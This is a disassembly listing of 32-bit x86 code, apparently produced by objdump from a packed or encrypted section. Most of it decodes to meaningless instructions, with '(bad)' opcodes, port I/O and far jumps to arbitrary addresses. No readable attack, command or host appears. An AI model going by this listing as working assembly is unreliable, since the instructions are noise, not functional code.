  414d70:	xchg   edi,eax
  414d71:	mov    eax,0xc1db286e
  414d76:	popf   
  414d77:	mov    ah,0x65
  414d79:	push   cs
  414d7a:	xor    al,0xc5
  414d7c:	cs fs push ds
  414d7f:	iret   
  414d80:	shl    edi,0x24
  414d83:	mov    esi,0x9831afb6
  414d88:	xchg   esi,eax
  414d89:	sbb    eax,0x495a7264
  414d8e:	jmp    0x414dc2
  414d90:	mov    ecx,0x2bda7670
  414d95:	in     eax,dx
  414d96:	sbb    al,0x51
  414d98:	jnp    0x414d4f
  414d9a:	pusha  
  414d9b:	lods   al,BYTE PTR ds:[esi]
  414d9c:	lock loop 0x414d89
  414d9f:	jle    0x414dbc
  414da1:	div    edx
  414da3:	popf   
  414da4:	add    eax,DWORD PTR [ecx-0xcea2bf5]
  414daa:	cld    
  414dab:	out    dx,al
  414dac:	add    BYTE PTR [esi+0x527727c0],ah
  414db2:	add    bl,ch
  414db4:	adc    al,0xca
  414db6:	fisttp WORD PTR [esi+0x1c404a33]
  414dbc:	leave  
  414dbd:	xadd   DWORD PTR [ebx],esp
  414dc0:	out    0x3f,al
  414dc2:	jp     0x414de0
  414dc4:	ffree  st(7)
  414dc6:	das    
  414dc7:	loop   0x414e1f
  414dc9:	mov    ch,0xe4
  414dcb:	add    DWORD PTR [eax-0x5ec69c49],esi
  414dd1:	push   0x2f103ebe
  414dd6:	lock add al,0x78
  414dd9:	pop    esp
  414dda:	adc    ecx,ecx
  414ddc:	test   BYTE PTR [esi-0x2c],bh
  414ddf:	add    eax,0x78c6981
  414de4:	sbb    al,0xc4
  414de6:	cwde   
  414de7:	mov    esp,0xe60500b0
  414dec:	mov    dh,0x4d
  414dee:	into   
  414def:	std    
  414df0:	or     al,dl
  414df2:	mov    ebp,0xe769469c
  414df7:	and    esi,ebp
  414df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dfa:	jno    0x414d94
  414dfc:	mov    bh,0x5c
  414dfe:	addr16 std 
  414e00:	mov    ch,0x1c
  414e02:	mov    bl,0xe7
  414e04:	fucom  st(5)
  414e06:	sub    al,0x3e
  414e08:	mov    bh,dh
  414e0a:	mov    bh,0x15
  414e0c:	sub    eax,0xc420687a
  414e11:	xor    ebx,DWORD PTR [esi]
  414e13:	ins    DWORD PTR es:[edi],dx
  414e14:	mov    eax,0xc6c62b8d
  414e19:	mov    cl,0x7c
  414e1b:	fiadd  DWORD PTR [eax-0x1bb87ae2]
  414e21:	pop    esi
  414e22:	popa   
  414e23:	nop
  414e24:	mov    esi,0x21ff9296
  414e29:	dec    edi
  414e2a:	icebp  
  414e2b:	jne    0x414e97
  414e2d:	add    DWORD PTR [ecx+edi*1-0x1e],edi
  414e31:	pop    ds
  414e32:	xor    edi,ecx
  414e34:	inc    eax
  414e35:	push   es
  414e36:	push   ebp
  414e37:	into   
  414e38:	pop    ebp
  414e39:	or     eax,0xbb9a98a5
  414e3e:	push   ebx
  414e3f:	or     eax,0xbdd56284
  414e44:	sbb    BYTE PTR [ecx-0x46],bh
  414e47:	or     eax,0x521be86
  414e4c:	cmp    al,0x46
  414e4e:	inc    esi
  414e4f:	pop    ss
  414e50:	aaa    
  414e51:	call   0x1495:0xc063128d
  414e58:	arpl   sp,ax
  414e5a:	push   es
  414e5b:	fist   DWORD PTR [esi]
  414e5d:	imul   ebp,DWORD PTR [esi],0xe1db83d8
  414e63:	adc    BYTE PTR [edx+0x1f],al
  414e66:	cmp    BYTE PTR [edi+0x1165bb38],bl
  414e6c:	sub    eax,0xba66269e
  414e71:	or     edx,ebx
  414e73:	into   
  414e74:	rol    DWORD PTR [ebp+0x6e381ad3],0xd0
  414e7b:	call   0x1b9df3ea
  414e80:	(bad)  
  414e81:	mov    bx,0x9cae
  414e85:	mov    dh,0xa8
  414e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e88:	ror    edi,cl
  414e8a:	pushf  
  414e8b:	push   esp
  414e8c:	mov    esi,0xeb725c8a
  414e91:	mov    al,ds:0xc8192c3d
  414e96:	ins    DWORD PTR es:[edi],dx
  414e97:	xchg   edx,eax
  414e98:	and    ebx,edx
  414e9a:	lds    esi,FWORD PTR [ebp-0x34]
  414e9d:	sub    esp,DWORD PTR [eax+0x62]
  414ea0:	xor    eax,0x7651e06f
  414ea5:	adc    eax,0x67b0336a
  414eaa:	xlat   BYTE PTR ds:[ebx]
  414eab:	inc    ecx
  414eac:	xchg   esp,eax
  414ead:	inc    edx
  414eae:	mov    al,0xd1
  414eb0:	shr    DWORD PTR [eax],0x45
  414eb3:	mov    ecx,0x5abe457a
  414eb8:	inc    ecx
  414eb9:	leave  
  414eba:	je     0x414e66
  414ebc:	ficomp WORD PTR [ebp-0x12]
  414ebf:	hlt    
  414ec0:	das    
  414ec1:	cs (bad) 
  414ec4:	xchg   BYTE PTR [esi-0x21],dl
  414ec7:	push   es
  414ec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ec9:	js     0x414f05
  414ecb:	jecxz  0x414e73
  414ecd:	xor    bh,cl
  414ecf:	scas   al,BYTE PTR es:[edi]
  414ed0:	mov    ds:0x35f706c,eax
  414ed5:	adc    eax,0xb5e97e43
  414eda:	add    BYTE PTR [edx+ebp*1-0x44],ah
  414ede:	mov    WORD PTR [ecx+esi*2],?
  414ee1:	out    dx,al
  414ee2:	lods   al,BYTE PTR ds:[esi]
  414ee3:	inc    ecx
  414ee4:	mov    dl,0x37
  414ee6:	cmp    al,BYTE PTR [edx+0x36feaec7]
  414eec:	push   0xffffffe1
  414eee:	shl    DWORD PTR [ebx],cl
  414ef0:	in     eax,0x9c
  414ef2:	mov    DWORD PTR [ecx+0x60370104],eax
  414ef8:	(bad)  
  414ef9:	and    ch,bh
  414efb:	nop
  414efc:	ja     0x414eb2
  414efe:	(bad)  
  414eff:	cmp    eax,0x46ba7fd0
  414f04:	or     dl,BYTE PTR [eax-0x50a19ed5]
  414f0a:	xor    BYTE PTR [ebp+0x42531a86],0x12
  414f11:	add    BYTE PTR [bp+si+0x66],0x6b
  414f16:	sub    edi,DWORD PTR [ebx]
  414f18:	mov    al,ds:0x6f1cc355
  414f1d:	xchg   esi,eax
  414f1e:	mov    dh,0x9f
  414f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f21:	pop    edi
  414f22:	add    ecx,DWORD PTR [ebx]
  414f24:	shl    esi,1
  414f26:	ret    0xf9e3
  414f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f2a:	mov    eax,ds:0x756f3cbb
  414f2f:	aam    0x11
  414f31:	int    0xcf
  414f33:	(bad)  
  414f34:	in     eax,dx
  414f35:	xor    al,0x2e
  414f37:	clc    
  414f38:	stos   BYTE PTR es:[edi],al
  414f39:	and    DWORD PTR [esi+0x6d],esp
  414f3c:	mov    cl,0x32
  414f3e:	hlt    
  414f3f:	lds    esi,FWORD PTR [edx-0x494840cf]
  414f45:	mov    eax,ds:0xb53e11a3
  414f4a:	mov    esi,0xd7288664
  414f4f:	adc    bl,0x14
  414f52:	ins    DWORD PTR es:[edi],dx
  414f53:	pop    esp
  414f54:	mov    ebx,0x1d806f0a
  414f59:	pushf  
  414f5a:	out    0x4f,al
  414f5c:	dec    ebx
  414f5d:	data16 ss int 0x6a
  414f61:	stos   DWORD PTR es:[edi],eax
  414f62:	sar    DWORD PTR [esp+edx*8-0x2e04aee5],cl
  414f69:	aad    0x6f
  414f6b:	pop    esi
  414f6c:	cld    
  414f6d:	inc    ecx
  414f6e:	es fs stc 
  414f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f72:	cmp    ecx,ebp
  414f74:	add    bh,bl
  414f76:	rol    BYTE PTR [ecx-0x7e0f1d0e],1
  414f7c:	fucom  st(4)
  414f7e:	mov    eax,ds:0x39a1868b
  414f83:	or     edi,DWORD PTR [eax+ebp*2-0x630b0126]
  414f8a:	add    DWORD PTR [ebx],ecx
  414f8c:	push   ebp
  414f8d:	push   0x78
  414f8f:	inc    eax
  414f90:	or     al,0x18
  414f92:	adc    BYTE PTR ds:0x84bd5955,0x79
  414f99:	cmc    
  414f9a:	inc    ebp
  414f9b:	cmc    
  414f9c:	mov    ds:0x2ac8bcd0,eax
  414fa1:	jb     0x414f8a
  414fa3:	mov    DWORD PTR [esi+0x74],esp
  414fa6:	sbb    eax,0x12b521cc
  414fab:	xchg   ebp,eax
  414fac:	inc    ebx
  414fad:	jecxz  0x414ff8
  414faf:	les    ebx,FWORD PTR [esi+0x46]
  414fb2:	mov    esi,DWORD PTR gs:[ebp-0x671b19f3]
  414fb9:	dec    esp
  414fba:	jle    0x415035
  414fbc:	jecxz  0x414fcf
  414fbe:	adc    BYTE PTR [edi-0x58a30f33],cl
  414fc4:	sub    eax,ebp
  414fc6:	sub    al,0xd4
  414fc8:	inc    edi
  414fc9:	add    eax,0xfcdc145e
  414fce:	lock push cs
  414fd0:	jecxz  0x414ffc
  414fd2:	jb     0x41503b
  414fd4:	mov    ch,0xf
  414fd6:	mov    ah,0xfc
  414fd8:	sbb    edx,DWORD PTR ds:0xa9808117
  414fde:	sub    eax,0x86267631
  414fe3:	sub    BYTE PTR [esi-0xe],dl
  414fe6:	or     DWORD PTR [ebp-0x4c0e188a],esp
  414fec:	mov    eax,ds:0x976acb21
  414ff1:	lahf   
  414ff2:	xor    BYTE PTR [ecx],bl
  414ff4:	int    0x16
  414ff6:	sbb    al,0x1e
  414ff8:	sbb    al,0xa7
  414ffa:	jmp    0x7116:0x81c6b267
  415001:	mov    dl,0x14
  415003:	pop    ds
  415004:	push   ecx
  415005:	cs stos DWORD PTR es:[edi],eax
  415007:	ret    
  415008:	adc    ch,BYTE PTR [edi+0x7e]
  41500b:	imul   esi,DWORD PTR [ebx],0xffffffcd
  41500e:	jg     0x41504e
  415010:	stos   DWORD PTR es:[di],eax
  415012:	sub    eax,DWORD PTR [eax-0x7ff94981]
  415018:	cmc    
  415019:	sub    eax,0xcd1de5c3
  41501e:	outs   dx,BYTE PTR ds:[esi]
  41501f:	or     ch,bh
  415021:	and    al,0xdf
  415023:	ins    DWORD PTR es:[edi],dx
  415024:	xchg   esi,eax
  415025:	test   BYTE PTR [ebx],bh
  415027:	push   esp
  415028:	(bad)  
  41502a:	or     al,0x79
  41502c:	adc    edx,DWORD PTR [ecx+esi*4]
  41502f:	imul   esi,DWORD PTR [ecx+0xc],0x51
  415033:	mov    dl,0x4a
  415035:	(bad)  
  415037:	imul   eax,DWORD PTR [edx+0xe],0x6f1f6c87
  41503e:	sub    al,0x52
  415040:	xor    ebp,DWORD PTR [ecx-0x37baaeda]
  415046:	pop    ss
  415047:	call   0xeeb0123f
  41504c:	loop   0x415097
  41504e:	push   ds
  41504f:	cli    
  415050:	fimul  WORD PTR [eax]
  415052:	or     ebx,DWORD PTR [edx+0x33d61725]
  415058:	mov    ch,0x86
  41505a:	out    dx,al
  41505b:	fiadd  WORD PTR [ebp+ebp*4-0x2966696a]
  415062:	loope  0x414fed
  415064:	les    esi,FWORD PTR [ebx]
  415066:	sar    BYTE PTR [ecx+eax*4],1
  415069:	fcom   DWORD PTR [eax]
  41506b:	fadd   DWORD PTR [ebx+ecx*2-0x2c706e5]
  415072:	push   0x2b
  415074:	sti    
  415075:	inc    edx
  415076:	or     esi,DWORD PTR [ebp+0x15]
  415079:	mov    ch,0xd
  41507b:	xchg   edx,eax
  41507c:	pop    esi
  41507d:	cli    
  41507e:	lods   eax,DWORD PTR ds:[esi]
  41507f:	cli    
  415080:	xchg   edi,eax
  415081:	or     al,0x56
  415083:	sbb    eax,0x537a1131
  415088:	ficomp DWORD PTR [ecx+0x60]
  41508b:	mov    bl,0x26
  41508d:	aas    
  41508e:	mov    ebx,0xfa041953
  415093:	mov    bl,0xbc
  415095:	clc    
  415096:	into   
  415097:	aam    0xd4
  415099:	dec    ebp
  41509a:	js     0x4150d8
  41509c:	mov    ds:0xcbecc274,al
  4150a1:	add    al,0xcc
  4150a3:	bound  esp,QWORD PTR [esi-0x71]
  4150a6:	lea    edx,[ebp-0x6ea7a2c2]
  4150ac:	add    bh,cl
  4150ae:	mov    dh,0x36
  4150b0:	aad    0x3c
  4150b2:	sub    al,0x20
  4150b4:	je     0x415126
  4150b6:	xor    DWORD PTR [esi+edx*1+0x12],ecx
  4150ba:	sahf   
  4150bb:	sub    eax,0x98213146
  4150c0:	cmp    cl,0xb5
  4150c3:	mov    edx,0xabc05f7f
  4150c8:	xor    eax,0x76b2f86f
  4150cd:	adc    eax,0x227a8342
  4150d2:	hlt    
  4150d3:	adc    bl,BYTE PTR [esi]
  4150d5:	adc    ch,BYTE PTR [esp+eax*2+0x5a3e9e00]
  4150dc:	pop    edx
  4150dd:	push   ecx
  4150de:	fwait
  4150df:	xchg   ebx,eax
  4150e0:	jnp    0x415140
  4150e2:	sub    esp,DWORD PTR [ebx]
  4150e4:	loope  0x415118
  4150e6:	or     DWORD PTR [eax-0x42],edx
  4150e9:	or     cl,bh
  4150eb:	sub    al,0xdd
  4150ed:	ror    BYTE PTR [edi-0x5a],0x8c
  4150f1:	adc    al,dh
  4150f3:	nop
  4150f4:	fdivr  QWORD PTR [eax]
  4150f6:	xchg   esp,eax
  4150f7:	xor    bl,BYTE PTR [edi+0x3f]
  4150fa:	fldenv [edi]
  4150fc:	cmp    al,0x77
  4150fe:	adc    bl,cl
  415100:	xor    al,0xc1
  415102:	addr16 jg 0x4150c1
  415105:	sahf   
  415106:	and    BYTE PTR [edx],0xe5
  415109:	fistp  DWORD PTR [ebx]
  41510b:	call   0x2a39:0x6180d55e
  415112:	or     eax,0xfe576e4c
  415117:	or     BYTE PTR [edx],dl
  415119:	mov    esp,0x7f977742
  41511e:	jge    0x4150a8
  415120:	pop    ecx
  415121:	push   0x2158646d
  415126:	mov    bl,0x2c
  415128:	push   es
  415129:	pop    ebx
  41512a:	push   ebx
  41512b:	fdivr  DWORD PTR [eax-0x38c5e423]
  415131:	aaa    
  415132:	ret    
  415133:	out    0x86,al
  415135:	mov    eax,0x67605f7a
  41513a:	arpl   WORD PTR [edx-0x3],ax
  41513d:	pop    ss
  41513e:	jp     0x4150d6
  415140:	dec    ebx
  415141:	dec    esi
  415142:	repz cli 
  415144:	out    0x10,eax
  415146:	mov    es,WORD PTR [edi+0x54413dcc]
  41514c:	outs   dx,BYTE PTR ds:[esi]
  41514d:	dec    edi
  41514e:	sub    edi,DWORD PTR [ebp+0x59]
  415151:	ja     0x4151c3
  415153:	mov    ch,0xb
  415155:	pcmpeqw mm0,mm7
  415158:	scas   eax,DWORD PTR es:[edi]
  415159:	cmp    edx,DWORD PTR [ecx]
  41515b:	fst    QWORD PTR [eax+0x4b]
  41515e:	gs (bad) 
  415160:	sbb    esp,DWORD PTR [esp+esi*1-0x3fa5ea3d]
  415167:	test   al,0x91
  415169:	pop    ebx
  41516a:	pop    esp
  41516b:	push   esp
  41516c:	adc    DWORD PTR [eax-0x8],esp
  41516f:	pop    DWORD PTR [edx-0x7b02ea01]
  415175:	mov    ds:0xe31a0e02,eax
  41517a:	jae    0x4151dd
  41517c:	adc    edx,DWORD PTR [ebp+ebx*8+0x58]
  415180:	neg    esi
  415182:	dec    ebx
  415183:	in     al,dx
  415184:	rol    BYTE PTR [eax+0x5de7883c],1
  41518a:	loope  0x415166
  41518c:	call   0x964c:0x1a69b20b
  415193:	lea    esi,[ebx]
  415195:	fs xchg esp,eax
  415197:	lea    edx,[edx]
  415199:	scas   al,BYTE PTR es:[edi]
  41519a:	jmp    0x415218
  41519c:	dec    ecx
  41519d:	inc    ecx
  41519e:	pop    esp
  41519f:	mov    ebx,esi
  4151a1:	push   ebx
  4151a2:	(bad)  
  4151a3:	ss jbe 0x415184
  4151a6:	dec    esp
  4151a7:	mov    eax,0xad2bb138
  4151ac:	imul   esp,DWORD PTR [edx-0x59],0x3179b474
  4151b3:	inc    esi
  4151b4:	ficomp WORD PTR [ebx+ebp*2]
  4151b7:	je     0x4151d4
  4151b9:	sub    al,0x85
  4151bb:	les    esi,FWORD PTR [ecx]
  4151bd:	aas    
  4151be:	pop    ebx
  4151bf:	loop   0x4151ad
  4151c1:	ja     0x415219
  4151c3:	adc    al,0x45
  4151c5:	ss xor eax,0xa1567d45
  4151cb:	sbb    al,0x84
  4151cd:	mov    ecx,0x8a0c43e6
  4151d2:	in     eax,dx
  4151d3:	fdiv   DWORD PTR [esi]
  4151d5:	adc    DWORD PTR [esi-0x68c7b278],edx
  4151db:	adc    DWORD PTR [ebx-0x45dbbc79],ecx
  4151e1:	adc    ah,0x76
  4151e4:	shl    BYTE PTR [edi],cl
  4151e6:	xchg   ebp,eax
  4151e7:	jle    0x415217
  4151e9:	push   edx
  4151ea:	ret    
  4151eb:	jmp    0x3e8c371b
  4151f0:	mov    DWORD PTR [edx],eax
  4151f2:	iret   
  4151f3:	push   es
  4151f4:	nop
  4151f5:	std    
  4151f6:	outs   dx,DWORD PTR ds:[esi]
  4151f7:	pop    es
  4151f8:	mov    BYTE PTR [ecx+0xa],ch
  4151fb:	sub    ecx,ebp
  4151fd:	(bad)  
  4151fe:	call   0xcad:0x96bf1685
  415205:	cmp    BYTE PTR [ebx],ch
  415207:	lea    ebx,[eax]
  415209:	cmp    ah,bh
  41520b:	lods   al,BYTE PTR ds:[esi]
  41520c:	push   0x61
  41520e:	bnd jle 0x41519c
  415211:	adc    ah,al
  415213:	xor    al,0xc
  415215:	aaa    
  415216:	cmp    eax,0x6c448ca8
  41521b:	lods   al,BYTE PTR ds:[esi]
  41521c:	and    esp,edi
  41521e:	popf   
  41521f:	addr16 push ebx
  415221:	mov    cl,0xa0
  415223:	jg     0x415290
  415225:	js     0x4151f3
  415227:	lock outs dx,BYTE PTR ds:[esi]
  415229:	pusha  
  41522a:	sbb    al,BYTE PTR [edi+ecx*4-0x3f]
  41522e:	test   al,0xe0
  415230:	xchg   esi,eax
  415231:	jns    0x415248
  415233:	loop   0x41526d
  415235:	(bad)  
  415236:	imul   edi,DWORD PTR [edi],0x6
  415239:	cdq    
  41523a:	cmp    eax,0x7ec988e4
  41523f:	(bad)  
  415240:	xor    eax,0x4784a91a
  415245:	pop    edi
  415246:	vunpckhpd ymm4,ymm2,YMMWORD PTR [edx+0x16]
  41524c:	mov    bl,0xe8
  41524e:	jae    0x415227
  415250:	pop    ebx
  415251:	aas    
  415252:	ins    DWORD PTR es:[edi],dx
  415253:	add    DWORD PTR [edx+0x4eb90b56],ebp
  415259:	fldl2e 
  41525b:	mov    al,ds:0xf3822d26
  415260:	int    0x18
  415262:	cmp    eax,0x6877ae28
  415267:	sub    BYTE PTR [esi],ah
  415269:	popa   
  41526a:	jbe    0x415208
  41526c:	jp     0x4151fb
  41526e:	xor    BYTE PTR [esi],bl
  415270:	sbb    ebp,DWORD PTR [eax+0x1572657f]
  415276:	retf   
  415277:	call   0x929d9794
  41527c:	inc    ebx
  41527d:	cmp    esi,ecx
  41527f:	adc    ecx,DWORD PTR [esi-0x20]
  415282:	bound  eax,QWORD PTR [eax-0x50]
  415285:	in     eax,0xa2
  415287:	std    
  415288:	je     0x4152ff
  41528a:	sub    ecx,DWORD PTR [ecx]
  41528c:	jp     0x41520f
  41528e:	outs   dx,BYTE PTR ds:[esi]
  41528f:	jge    0x4152bf
  415291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415292:	sbb    BYTE PTR [esi+edi*2-0x70675cf9],bl
  415299:	xchg   esp,eax
  41529a:	leave  
  41529b:	lds    ebp,FWORD PTR [ecx+0x7e350df0]
  4152a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152a2:	(bad)  
  4152a3:	stos   DWORD PTR es:[edi],eax
  4152a4:	mov    fs,WORD PTR [ebp+0x74]
  4152a7:	pop    esi
  4152a8:	fwait
  4152a9:	clc    
  4152aa:	xchg   esp,eax
  4152ab:	sub    BYTE PTR ds:0x1266abb9,ah
  4152b1:	and    esp,DWORD PTR [ecx-0x52a75a02]
  4152b7:	dec    edi
  4152b8:	in     al,0x6f
  4152ba:	in     al,dx
  4152bb:	jg     0x415257
  4152bd:	jo     0x415303
  4152bf:	(bad)  
  4152c0:	jae    0x415326
  4152c2:	call   0x7d2:0x19600e1a
  4152c9:	stos   DWORD PTR es:[edi],eax
  4152ca:	in     al,0xf6
  4152cc:	(bad)  
  4152cd:	push   edx
  4152ce:	(bad)
  4152d1:	push   eax
  4152d2:	xor    DWORD PTR [esi-0x2f],edi
  4152d5:	ja     0x4152cb
  4152d7:	jg     0x415352
  4152d9:	call   0xf3b0c4e0
  4152de:	mov    ds:0xd656f004,eax
  4152e3:	inc    ecx
  4152e4:	dec    ebp
  4152e5:	icebp  
  4152e6:	sbb    eax,0x5dd0b67f
  4152eb:	data16 and al,0x3d
  4152ee:	das    
  4152ef:	fcmovnu st,st(6)
  4152f1:	arpl   WORD PTR ds:0xc489d996,cx
  4152f7:	lea    eax,[eax]
  4152f9:	scas   eax,DWORD PTR es:[edi]
  4152fa:	daa    
  4152fb:	and    ah,ah
  4152fd:	mov    ds:0x196f4f6,eax
  415302:	jg     0x41530b
  415304:	push   esp
  415305:	shl    DWORD PTR ds:0x6b8bad6b,1
  41530b:	fbld   TBYTE PTR [esi+0x5f]
  41530e:	ror    DWORD PTR [ecx+0xb],cl
  415311:	push   ss
  415312:	repnz push 0x7b2f6ea5
  415318:	mov    ebx,0x4cf96f10
  41531d:	(bad)  
  41531e:	and    BYTE PTR [edx],dh
  415320:	jmp    0x5f9f:0x692efd57
  415327:	pop    edi
  415328:	inc    eax
  415329:	fcom   QWORD PTR [edx+0x77]
  41532c:	jns    0x415362
  41532e:	mov    edx,0x60316bc3
  415333:	or     ebx,DWORD PTR [ecx+0x12]
  415336:	inc    DWORD PTR [ebx-0x25c0c8f7]
  41533c:	cmp    al,0xbb
  41533e:	mov    ecx,0xa9f6e02a
  415343:	nop
  415344:	je     0x415323
  415346:	add    al,0x22
  415348:	mov    esp,0xa38a58d3
  41534d:	ret    0x559a
  415350:	jecxz  0x4152fb
  415352:	js     0x4153a7
  415354:	dec    ecx
  415355:	nop
  415356:	fsubrp st(1),st
  415358:	bound  esi,QWORD PTR [eax-0x55]
  41535b:	jl     0x4153aa
  41535d:	and    ah,0x7f
  415360:	jmp    0xc219a1e
  415365:	nop
  415366:	into   
  415367:	inc    dx
  415369:	jo     0x415318
  41536b:	jne    0x415358
  41536d:	ds inc edi
  41536f:	and    al,0x8d
  415371:	jp     0x415368
  415373:	add    al,0x38
  415375:	clc    
  415376:	pusha  
  415377:	add    esi,DWORD PTR [edx]
  415379:	std    
  41537a:	stos   BYTE PTR es:[edi],al
  41537b:	pop    es
  41537c:	or     DWORD PTR [esp+edi*1+0x40864abf],esp
  415383:	scas   al,BYTE PTR es:[edi]
  415384:	nop
  415385:	pop    esp
  415386:	outs   dx,DWORD PTR ds:[esi]
  415387:	add    al,0x1f
  415389:	fcom   QWORD PTR [ebx-0x50d86335]
  41538f:	aad    0x81
  415391:	or     eax,0x3f580a7c
  415396:	push   ecx
  415397:	dec    esp
  415398:	fwait
  415399:	leave  
  41539a:	rep lods al,BYTE PTR ds:[esi]
  41539c:	jbe    0x415350
  41539e:	cli    
  41539f:	fs pop esp
  4153a1:	xchg   edi,eax
  4153a2:	push   cs
  4153a3:	imul   edx,DWORD PTR [esi+esi*1],0xffffffb6
  4153a7:	enter  0xb6f,0x6c
  4153ab:	inc    esp
  4153ac:	fsub   QWORD PTR [esi+eiz*4-0x1607c293]
  4153b3:	cdq    
  4153b4:	inc    esi
  4153b5:	mov    cl,0x32
  4153b7:	call   0x8eb4:0x5ec852d5
  4153be:	sar    BYTE PTR [edi-0x2c3a6d16],cl
  4153c4:	out    0x20,eax
  4153c6:	xchg   esp,eax
  4153c7:	mov    DWORD PTR [eax],ebx
  4153c9:	fldcw  WORD PTR [ebx]
  4153cb:	pop    edi
  4153cc:	stos   BYTE PTR es:[edi],al
  4153cd:	leave  
  4153ce:	mov    ebp,0x46d5720c
  4153d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153d4:	xchg   esi,eax
  4153d5:	adc    BYTE PTR [edx],0xd4
  4153d8:	mov    edi,0xf8d43ea8
  4153dd:	xor    BYTE PTR [edx+0x71],dl
  4153e0:	push   0xffffffe7
  4153e2:	ins    BYTE PTR es:[edi],dx
  4153e3:	and    eax,0x380fd7d9
  4153e8:	lahf   
  4153e9:	push   ss
  4153ea:	jo     0x41543b
  4153ec:	cmp    ebp,DWORD PTR [ecx+0x156b5742]
  4153f2:	aad    0x7b
  4153f4:	mov    ch,0xe4
  4153f6:	fstp   DWORD PTR [edi+0x1258b60d]
  4153fc:	jmp    0x415381
  4153fe:	repz aas 
  415400:	xchg   DWORD PTR [edi+0xcb2e5c5],edx
  415406:	mov    ds:0xc998e1f2,al
  41540b:	mov    esp,ebp
  41540d:	and    eax,0x36f5053
  415412:	and    eax,edi
  415414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415415:	push   ecx
  415416:	mov    edi,0x5b3c9e4e
  41541b:	aaa    
  41541c:	and    esp,edx
  41541e:	shl    BYTE PTR [edx-0x1b],cl
  415421:	sbb    BYTE PTR [eax+0x78630ef3],dh
  415427:	add    ebx,ebx
  415429:	jmp    FWORD PTR [eax]
  41542b:	mov    esp,0x2f2b4dd
  415430:	ss inc ebp
  415432:	rcl    BYTE PTR ds:0xcf932cbb,0x9a
  415439:	or     al,0x29
  41543b:	out    dx,eax
  41543c:	jo     0x415493
  41543e:	push   cs
  41543f:	adc    eax,0x651ca72c
  415444:	xchg   edi,eax
  415445:	pop    esp
  415446:	mov    ebx,0x3695dab3
  41544b:	push   esi
  41544c:	jmp    0x9eb15e69
  415451:	pop    edx
  415452:	xchg   esp,eax
  415453:	sbb    al,0xae
  415455:	loope  0x4153fc
  415457:	and    DWORD PTR [esi+0x547f3a30],edx
  41545d:	push   eax
  41545e:	addr16 cld 
  415460:	pop    ds
  415461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415462:	xor    edi,ebx
  415464:	int3   
  415465:	icebp  
  415466:	xor    al,dl
  415468:	or     dl,BYTE PTR [edx+0x2]
  41546b:	sbb    dh,BYTE PTR [edi+0x36]
  41546e:	dec    edx
  41546f:	outs   dx,BYTE PTR ds:[esi]
  415470:	jecxz  0x4153f2
  415472:	pop    eax
  415473:	addr16 xor al,0xc6
  415476:	nop
  415477:	ja     0x415481
  415479:	icebp  
  41547a:	sub    BYTE PTR ds:0x9035a474,0x8e
  415481:	repnz mov eax,ds:0xceaae27a
  415487:	pushf  
  415488:	mov    eax,0x911a409a
  41548d:	or     bh,dl
  41548f:	ror    BYTE PTR [ebx-0x67e9235d],cl
  415495:	out    0x95,al
  415497:	in     al,dx
  415498:	xchg   ebx,eax
  415499:	ins    DWORD PTR es:[edi],dx
  41549a:	adc    BYTE PTR [edi+0x3f],cl
  41549d:	xchg   DWORD PTR [ebx+0x779cedf2],edx
  4154a3:	leave  
  4154a4:	popa   
  4154a5:	mov    esi,0xb860857e
  4154aa:	and    eax,0x18a541e9
  4154af:	call   0x736:0x905c32
  4154b6:	out    0x7d,al
  4154b8:	inc    edx
  4154b9:	or     DWORD PTR [eax-0x4cef8c4b],edi
  4154bf:	jnp    0x415467
  4154c1:	fidivr DWORD PTR [eax+0x120541d5]
  4154c7:	jg     0x415523
  4154c9:	into   
  4154ca:	(bad)
  4154cf:	call   0x82cf:0xd00589f4
  4154d6:	(bad)  
  4154d7:	fcomp  st(4)
  4154d9:	inc    ebp
  4154da:	jmp    0x4d61:0x26d46a9a
  4154e1:	lods   al,BYTE PTR ds:[esi]
  4154e2:	jg     0x415465
  4154e4:	scas   eax,DWORD PTR es:[edi]
  4154e5:	imul   edi,DWORD PTR [ebp+0x55],0xffffff80
  4154e9:	gs jo  0x41552f
  4154ec:	(bad)  
  4154ed:	mov    eax,0x655c81b7
  4154f2:	data16 xlat BYTE PTR ds:[ebx]
  4154f4:	xor    edx,DWORD PTR [eax]
  4154f6:	aas    
  4154f7:	outs   dx,DWORD PTR ds:[esi]
  4154f8:	mov    ebx,0x992d79ba
  4154fd:	push   ebx
  4154fe:	push   es
  4154ff:	dec    DWORD PTR ds:0x4d63a27b
  415505:	(bad)  
  415507:	xor    al,0x60
  415509:	mov    edi,0x60edb2f5
  41550e:	data16 int3 
  415510:	pminub mm0,mm0
  415513:	jmp    FWORD PTR ds:0xaf05f484
  415519:	leave  
  41551a:	in     eax,dx
  41551b:	int    0x96
  41551d:	aad    0xc7
  41551f:	pop    edi
  415520:	sub    BYTE PTR [ecx],dl
  415522:	pop    ebx
  415523:	mov    eax,ds:0x6389088e
  415528:	mov    edi,0xb9e8ea11
  41552d:	shl    BYTE PTR [ecx+0x29],0xee
  415531:	push   cs
  415532:	les    esi,FWORD PTR [esi]
  415534:	jmp    0x14650522
  415539:	out    0x15,al
  41553b:	lods   al,BYTE PTR ds:[esi]
  41553c:	sub    eax,0x7cd83677
  415541:	sub    ecx,DWORD PTR [eax-0x56a744f5]
  415547:	push   ds
  415548:	mov    al,0x96
  41554a:	push   0xfffffff1
  41554c:	(bad)  
  41554d:	call   DWORD PTR [eax]
  41554f:	cmp    al,0x7
  415551:	aad    0xf8
  415553:	es jl  0x415533
  415556:	dec    ecx
  415557:	ret    
  415558:	adc    BYTE PTR [edx],0x9e
  41555b:	jno    0x41559b
  41555d:	addr16 dec esp
  41555f:	mov    ah,0xbf
  415561:	fwait
  415562:	mov    ebx,0xb852d488
  415568:	in     eax,0xd2
  41556a:	sub    dh,BYTE PTR [ebx+edi*8]
  41556d:	imul   ebx,DWORD PTR [esp+ebx*4-0x3f09d999],0x6e75a020
  415578:	es int 0x2b
